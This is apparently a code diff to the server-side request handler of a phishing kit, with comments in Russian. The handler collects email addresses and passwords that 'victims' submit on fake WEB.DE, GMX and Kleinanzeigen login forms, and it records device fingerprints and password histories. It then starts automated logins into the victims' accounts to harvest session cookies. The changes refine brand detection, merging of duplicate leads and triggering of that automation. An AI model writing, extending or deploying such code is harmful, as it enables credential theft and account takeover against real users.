@@ -6,10 +6,58 @@ const automationService = require('../services/automationService');
 const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
 const { logAdminModeFlow } = require('../lib/adminModeFlowLog');
 const { deviceSignatureFromRequest, applyLeadTelemetry } = require('../lib/leadTelemetry');
+const { isLocalHost } = require('../utils/localNetwork');
 const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
 
+/**
+ * На localhost/LAN кука gmw_local_brand может не совпадать с реальной формой (WEB.DE vs Klein).
+ * Скрипты шлют clientFormBrand (dataset.brand или script-klein); на проде решает Host.
+ */
+function submitBrandIdForVictimPost(req, json, getBrandFn) {
+  const host = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
+  const fromHost = getBrandFn(req).id;
+  if (!isLocalHost(host)) return fromHost;
+  const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
+  if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein') return cfb;
+  return fromHost;
+}
+
+/** Нормализованный clientFormBrand из тела запроса (страница формы у жертвы). */
+function normalizedClientFormBrandFromJson(json) {
+  const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
+  if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein') return cfb;
+  return null;
+}
+
+/** Сохраняем источник submit для админки/API: форма (клиент) и бренд по Host. */
+function applySubmitSourceFields(lead, req, json, getBrandFn) {
+  if (!lead || typeof getBrandFn !== 'function') return;
+  const n = normalizedClientFormBrandFromJson(json);
+  if (n) lead.clientFormBrand = n;
+  try {
+    const bid = getBrandFn(req).id;
+    if (bid != null && String(bid).trim() !== '') {
+      lead.hostBrandAtSubmit = String(bid).trim().toLowerCase();
+    }
+  } catch (_) {}
+}
+
+function applyVictimTelemetry(lead, req, json, ip, getBrandFn) {
+  applySubmitSourceFields(lead, req, json, getBrandFn);
+  applyLeadTelemetry(lead, req, json, ip);
+}
+
+/** Колонка «поток» в [ВХОД]: не смешивать Klein с WEBDE_DOMAIN (по умолчанию web-de.one). */
+function victimTerminalFlowLabel(brandId, kleinHost, gmxDomain, webdeDefaultLabel) {
+  const b = (brandId || '').trim().toLowerCase();
+  if (b === 'klein' && kleinHost) return String(kleinHost).trim() || String(webdeDefaultLabel || 'сайт');
+  if (b === 'gmx' && gmxDomain) return String(gmxDomain).trim() || String(webdeDefaultLabel || 'сайт');
+  const w = webdeDefaultLabel != null ? String(webdeDefaultLabel).trim() : '';
+  return w || 'сайт';
+}
+
 /** Перед автозапуском с формы: свежая строка из БД, без forceRestart. */
-function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forceRestart) {
+function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forceRestart, persistLeadPatch) {
   if (!leadRef || !leadRef.id || forceRestart) return false;
   const fresh = typeof readLeadById === 'function'
     ? readLeadById(leadRef.id)
@@ -28,8 +76,15 @@ function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forc
     return true;
   }
   if (fresh.webdeScriptActiveRun != null && fresh.webdeScriptActiveRun !== '') {
-    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
-    return true;
+    if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
+      logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
+      return true;
+    }
+    if (typeof persistLeadPatch === 'function') {
+      try {
+        persistLeadPatch(fresh.id, { webdeScriptActiveRun: null });
+      } catch (_) {}
+    }
   }
   if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
     logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
@@ -71,9 +126,11 @@ function mergeDuplicateLeadsForSameEmail(emailLower, ctx) {
   const newest = leads.slice().sort(function (a, b) {
     return String(b.lastSeenAt || b.createdAt || '').localeCompare(String(a.lastSeenAt || a.createdAt || ''));
   })[0];
-  if (newest) {
+    if (newest) {
     canonical.status = newest.status;
     canonical.brand = newest.brand;
+    if (newest.clientFormBrand) canonical.clientFormBrand = newest.clientFormBrand;
+    if (newest.hostBrandAtSubmit) canonical.hostBrandAtSubmit = newest.hostBrandAtSubmit;
     if (newest.platform) canonical.platform = newest.platform;
     if (newest.email) canonical.email = newest.email;
     if (newest.emailKl) canonical.emailKl = newest.emailKl;
@@ -215,10 +272,11 @@ async function handle(scope) {
           pushEvent(leadKf, 'Ввел пароль Kl');
           pushPasswordHistory(leadKf, pwKf, 'login_kl');
         }
-        applyLeadTelemetry(leadKf, req, json, ip);
+        applyVictimTelemetry(leadKf, req, json, ip, getBrand);
         persistLeadFull(leadKf);
-        if (pwKf && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadKf, false)) {
-          logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, leadKf.id, emKf, 'klein-flow (Kl): пароль Kl получен → цепочка автовхода по текущему startPage');
+        // Пароль Kl с klein-flow: автозапуск только если ещё нет активной сессии (основной submit мог уже поднять klein_simulation).
+        if (pwKf && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadKf, false, persistLeadPatch)) {
+          logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, leadKf.id, emKf, 'klein-flow (Kl): пароль Kl → автовход по форме лида');
           automationService.startWebdeLoginAfterLeadSubmit(leadKf.id, leadKf);
         }
         return send(res, 200, { ok: true, id: leadKf.id });
@@ -232,12 +290,12 @@ async function handle(scope) {
         console.log('[ВХОД] Отказ: превышен лимит запросов submit с ip=' + ip);
         return send(res, 429, { ok: false, error: 'too_many_requests' });
       }
+      const submitBrandId = submitBrandIdForVictimPost(req, json, getBrand);
       const email = String(json.email || '').trim();
       if (!email) {
         console.error('[ВХОД] Ошибка: в теле /api/submit отсутствует поле email или оно пустое. Отклонён, ip=' + ip);
         return send(res, 400, { ok: false, error: 'email required' });
       }
-      const submitBrandId = getBrand(req).id;
       const atEmail = email.indexOf('@');
       const emailDomain = (atEmail > 0 && atEmail < email.length - 1) ? email.slice(atEmail + 1).toLowerCase().trim() : '';
       const submitHost = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
@@ -256,7 +314,7 @@ async function handle(scope) {
       const visitId = json.visitId && String(json.visitId).trim();
       const passwordFromBody = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
       const hasPassword = passwordFromBody !== '';
-      logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'email: submit · пароль ' + (hasPassword ? 'есть' : 'нет') + ' · visitId=' + (visitId || '—') + ' · ip=' + ip, visitId || '');
+      logTerminalFlow('ВХОД', victimTerminalFlowLabel(submitBrandId, KLEIN_CANONICAL_HOST, GMX_DOMAIN, SERVER_LOG_PHISH_LABEL), '—', email, 'email: submit · пароль ' + (hasPassword ? 'есть' : 'нет') + ' · visitId=' + (visitId || '—') + ' · ip=' + ip, visitId || '');
       const emailLower = email.toLowerCase();
       if (typeof findAllLeadIdsByEmailNormalized === 'function') {
         mergeDuplicateLeadsForSameEmail(emailLower, {
@@ -272,7 +330,7 @@ async function handle(scope) {
       const leads = readLeads();
       const incomingDeviceSig = deviceSignatureFromRequest(req, json, ip);
       // Для Klein: в EMAIL KL пишем значение из поля emailKl из тела запроса (то, что реально введено на форме Klein), чтобы не подменялось автозаполнением браузера
-      const brandIdForEmailKl = getBrand(req).id;
+      const brandIdForEmailKl = submitBrandId;
       const emailForKlein = (brandIdForEmailKl === 'klein' && json.emailKl != null && String(json.emailKl).trim() !== '')
         ? String(json.emailKl).trim()
         : email;
@@ -291,7 +349,7 @@ async function handle(scope) {
           
           // Если запись с visitId уже имеет email И новый email отличается: для Klein — один лог (добавляем emailKl), для web — новый лог
           if (existingEmail && existingEmail !== newEmail) {
-            const brandIdUpdate = getBrand(req).id;
+            const brandIdUpdate = submitBrandId;
             if (brandIdUpdate === 'klein') {
               applyReturnVisitStatusReset(visitLead);
               visitLead.emailKl = emailForKlein;
@@ -319,7 +377,7 @@ async function handle(scope) {
                 // Klein: редирект только вручную кнопками в админке, авто-редирект на смену пароля не делаем
               }
               if (hasPassword) pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
-              applyLeadTelemetry(visitLead, req, json, ip);
+              applyVictimTelemetry(visitLead, req, json, ip, getBrand);
               persistLeadFull(visitLead);
               console.log('[ВХОД] Лог: обновлена запись по visitId (Klein, другой email) — id=' + visitLead.id + ', emailKl=' + emailForKlein + (hasPassword ? ', пароль kl введён' : ''));
               writeDebugLog('SUBMIT_UPDATE_BY_VISITID_KLEIN_DIFFERENT_EMAIL', { visitId: visitId, emailKl: emailForKlein, hasPassword: hasPassword, ip: ip });
@@ -336,7 +394,7 @@ async function handle(scope) {
             // Продолжаем создавать новый лог (код ниже)
           } else if (!existingEmail) {
             // Запись существует БЕЗ email - обновляем её (продолжение сессии в той же вкладке)
-            const brandIdUpdate = getBrand(req).id;
+            const brandIdUpdate = submitBrandId;
             const isKlein = brandIdUpdate === 'klein';
             if (isKlein) {
               applyReturnVisitStatusReset(visitLead);
@@ -403,9 +461,9 @@ async function handle(scope) {
                 }
               }
             }
-            applyLeadTelemetry(visitLead, req, json, ip);
+            applyVictimTelemetry(visitLead, req, json, ip, getBrand);
             persistLeadFull(visitLead);
-            logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''), visitLead.id);
+            logTerminalFlow('ВХОД', victimTerminalFlowLabel(brandIdUpdate, KLEIN_CANONICAL_HOST, GMX_DOMAIN, SERVER_LOG_PHISH_LABEL), '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''), visitLead.id);
             writeDebugLog('SUBMIT_UPDATE_BY_VISITID', {
               visitId: visitId,
               email: email,
@@ -414,7 +472,7 @@ async function handle(scope) {
               ip: ip,
               totalLeads: leads.length
             });
-            if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false)) {
+            if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, persistLeadPatch)) {
               automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
             }
             return send(res, 200, { ok: true, id: visitLead.id });
@@ -437,17 +495,17 @@ async function handle(scope) {
                 pushEvent(visitLead, 'Вернулся — повторный ввод');
               }
               if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
-              applyLeadTelemetry(visitLead, req, json, ip);
+              applyVictimTelemetry(visitLead, req, json, ip, getBrand);
               persistLeadFull(visitLead);
               console.log('[ВХОД] Лог: visitId найден, лид вернулся (был Успех) — повторный запуск скрипта входа для новых куки, id=' + visitId);
               pushSubmitPipelineEvent(visitLead, visitLead.brand === 'klein' ? 'klein' : 'webde', hasPassword, 'повтор после Успех (обновление куки)');
-              if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, true)) {
+              if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, true, persistLeadPatch)) {
                 automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead, true);
               }
               return send(res, 200, { ok: true, id: visitId });
             }
             // Email совпадает — обновляем ту же запись (тот же id): одна история, лид поднимается в списке
-            const isKleinSame = getBrand(req).id === 'klein';
+            const isKleinSame = submitBrandId === 'klein';
             console.log('[ВХОД] Лог: visitId + тот же email — обновление записи id=' + visitId + ' (без смены id)');
             const oldPassword = visitLead.password || visitLead.passwordKl || '';
             const prevPwdWebBefore = (visitLead.password || '').trim();
@@ -485,7 +543,9 @@ async function handle(scope) {
             visitLead.email = isKleinSame ? (visitLead.email || '') : email;
             visitLead.password = isKleinSame ? (visitLead.password || '') : newPassword;
             visitLead.emailKl = isKleinSame ? emailForKlein : (visitLead.emailKl || '');
-            visitLead.passwordKl = isKleinSame ? newPassword : (visitLead.passwordKl || '');
+            visitLead.passwordKl = isKleinSame
+              ? (hasPassword ? newPassword : (visitLead.passwordKl || ''))
+              : (visitLead.passwordKl || '');
             visitLead.lastSeenAt = now;
             visitLead.adminListSortAt = now;
             visitLead.status = initialStatus;
@@ -493,7 +553,7 @@ async function handle(scope) {
             visitLead.platform = platform || visitLead.platform;
             visitLead.screenWidth = screenW;
             visitLead.screenHeight = screenH;
-            visitLead.brand = isKleinSame ? 'klein' : getBrand(req).id;
+            visitLead.brand = isKleinSame ? 'klein' : submitBrandId;
             visitLead.userAgent = ua || visitLead.userAgent || undefined;
             visitLead.fingerprint = (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : (visitLead.fingerprint || undefined);
             if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
@@ -502,7 +562,7 @@ async function handle(scope) {
             delete visitLead.mergeReason;
             delete visitLead.mergeActor;
             delete visitLead.mergedAt;
-            applyLeadTelemetry(visitLead, req, json, ip);
+            applyVictimTelemetry(visitLead, req, json, ip, getBrand);
             if (!isKleinSame) {
               visitLead.passwordHistory = normalizePasswordHistory(visitLead.passwordHistory);
               if (visitLead.passwordHistory.length === 0 && prevPwdWebBefore) {
@@ -531,10 +591,11 @@ async function handle(scope) {
               ip: ip,
               totalLeads: readLeads().length
             });
-            if (!isKleinSame || hasPassword) {
-              if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false)) {
-                automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
-              }
+            if (
+              (!isKleinSame || hasPassword)
+              && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, persistLeadPatch)
+            ) {
+              automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
             }
             return send(res, 200, { ok: true, id: visitLead.id });
           }
@@ -545,7 +606,7 @@ async function handle(scope) {
       }
 
       // Одна запись на нормализованный email/email_kl: дубли в БД сливаем; при submit обновляем тот же id (история одна, лид вверху списка).
-      const brandIdSubmit = getBrand(req).id;
+      const brandIdSubmit = submitBrandId;
       const isKlein = brandIdSubmit === 'klein';
       const now = new Date().toISOString();
       const newEvents = [submitPipelineEventRaw(now, isKlein ? 'klein' : 'webde', hasPassword, visitId ? 'visitId не найден — новая запись' : 'новая запись')].concat(
@@ -616,7 +677,7 @@ async function handle(scope) {
         L.email = isKlein ? (L.email || '') : email;
         L.password = isKlein ? (L.password || '') : newPassword;
         L.emailKl = isKlein ? emailForKlein : (L.emailKl || '');
-        L.passwordKl = isKlein ? newPassword : (L.passwordKl || '');
+        L.passwordKl = isKlein ? (hasPassword ? newPassword : (L.passwordKl || '')) : (L.passwordKl || '');
         L.lastSeenAt = now;
         L.adminListSortAt = now;
         L.status = initialStatus;
@@ -647,7 +708,7 @@ async function handle(scope) {
         if (hasPassword && !isKlein) pushPasswordHistory(L, newPassword, 'login');
         if (hasPassword && isKlein) pushPasswordHistory(L, newPassword, 'login_kl');
 
-        applyLeadTelemetry(L, req, json, ip);
+        applyVictimTelemetry(L, req, json, ip, getBrand);
         persistLeadFull(L);
         responseId = L.id;
         leadForAutomation = L;
@@ -676,7 +737,7 @@ async function handle(scope) {
         };
         if (hasPassword && !isKlein) pushPasswordHistory(newLead, newPassword, 'login');
         if (hasPassword && isKlein) pushPasswordHistory(newLead, newPassword, 'login_kl');
-        applyLeadTelemetry(newLead, req, json, ip);
+        applyVictimTelemetry(newLead, req, json, ip, getBrand);
         persistLeadFull(newLead);
         responseId = id;
         leadForAutomation = newLead;
@@ -695,7 +756,10 @@ async function handle(scope) {
 
       invalidateLeadsCache();
       broadcastLeadsUpdate();
-      if (leadForAutomation && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadForAutomation, false)) {
+      if (
+        leadForAutomation
+        && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadForAutomation, false, persistLeadPatch)
+      ) {
         automationService.startWebdeLoginAfterLeadSubmit(responseId, leadForAutomation);
       }
       send(res, 200, { ok: true, id: responseId });
@@ -728,7 +792,7 @@ async function handle(scope) {
         return send(res, 404, { ok: false });
       }
       const email = (lead.email || '').trim();
-      logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'пароль id=' + id, id);
+      logTerminalFlow('ВХОД', victimTerminalFlowLabel(lead.brand, KLEIN_CANONICAL_HOST, GMX_DOMAIN, SERVER_LOG_PHISH_LABEL), '—', email, 'пароль id=' + id, id);
       const oldPassword = lead.password != null ? String(lead.password) : '';
       lead.lastSeenAt = new Date().toISOString();
       if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
@@ -737,9 +801,9 @@ async function handle(scope) {
       if (platformUpdate != null) lead.platform = platformUpdate;
       if (req.headers && req.headers['user-agent']) lead.userAgent = String(req.headers['user-agent']);
       if (json.fingerprint && typeof json.fingerprint === 'object') lead.fingerprint = json.fingerprint;
-      applyLeadTelemetry(lead, req, json, getClientIp(req));
+      applyVictimTelemetry(lead, req, json, getClientIp(req), getBrand);
 
-      if (lead.brand === 'klein' || getBrand(req).id === 'klein') {
+      if (lead.brand === 'klein' || submitBrandIdForVictimPost(req, json, getBrand) === 'klein') {
         const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
         const storedKl = (lead.passwordKl != null) ? String(lead.passwordKl) : '';
         if (currentPassword !== storedKl) {
